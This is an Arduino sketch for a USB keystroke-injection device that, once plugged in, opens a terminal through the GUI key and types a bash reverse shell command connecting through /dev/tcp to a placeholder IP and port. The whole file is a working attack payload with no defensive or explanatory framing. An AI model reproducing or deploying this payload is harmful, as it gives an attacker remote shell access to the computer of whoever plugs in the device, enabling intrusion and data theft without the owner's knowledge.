#include <Keyboard.h>

void pressKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  delay(3000); 
  pressKey(KEY_LEFT_GUI);

  delay(750); 
  Keyboard.print("terminal");

  delay(750);
  pressKey(KEY_RETURN);

  delay(1500);
  Keyboard.print("/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'");

  delay(75);
  pressKey(KEY_RETURN);
}
 

void loop() {
}
